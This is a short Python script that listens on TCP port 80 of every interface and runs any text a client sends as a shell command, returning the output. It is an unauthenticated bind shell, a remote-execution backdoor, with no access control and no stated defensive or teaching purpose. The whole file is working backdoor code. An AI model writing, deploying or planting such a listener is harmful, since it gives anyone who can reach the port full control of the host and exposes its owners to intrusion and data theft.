import socket
import subprocess
import sys

# Create a TCP socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind to port 80
server_socket.bind(('0.0.0.0', 80))

# Listen for incoming connections
server_socket.listen(1)
print("Server is listening on port 80...")

def handle_client(client_socket):
    while True:
        # Receive data from client
        data = client_socket.recv(1024).decode()
        if not data:
            break
        print(f"Received command: {data}")
        
        # Execute the received command
        try:
            output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
            client_socket.send(output + b'\n')
        except Exception as e:
            client_socket.send(f"Error: {str(e)}\n".encode())

while True:
    # Accept a connection
    client_socket, addr = server_socket.accept()
    print(f"Connected by {addr}")
    
    # Handle the client
    handle_client(client_socket)
    
    # Close the connection
    client_socket.close()